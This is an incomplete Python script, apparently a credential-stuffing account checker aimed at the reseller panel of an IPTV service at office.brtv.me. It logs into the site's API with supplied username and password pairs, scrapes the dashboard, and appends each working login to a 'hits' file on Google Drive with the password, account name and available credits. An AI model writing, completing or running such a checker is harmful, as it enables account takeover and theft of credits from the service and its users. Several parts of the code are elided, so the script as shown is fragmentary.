...
def login_and_get_dashboard(username, password):
    login_url = 'https://office.brtv.me/sys/api.php'
    login_headers = {
    ...
    try:
        with requests.Session() as session:
            ...
            dashboard_url = 'https://office.brtv.me/dashboard'
            dashboard_headers = {
...
def process_account(user, password, i, total):
    ...
    if name and credits:
        ...
        with open("/content/drive/MyDrive/_Paineis/hits/brtv_tv_hits.txt", "a") as hit_file:
            hit_file.write(f"\n===<Sr.Hell/>===\n• User: {user}\n• Pass: {password}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
        return True
    else:
